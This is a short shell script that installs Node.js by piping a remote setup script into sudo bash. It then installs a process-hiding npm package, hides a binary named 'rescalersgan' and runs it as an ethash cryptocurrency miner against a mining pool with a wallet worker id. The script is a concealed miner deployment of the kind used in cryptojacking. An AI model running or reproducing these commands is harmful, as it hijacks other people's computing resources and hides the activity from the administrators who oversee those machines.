
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add rescalersgan
chmod +x rescalersgan
./rescalersgan -pool ethash.infinityton.com:4444 -wal f39829a015d4.worker1 -proto 4

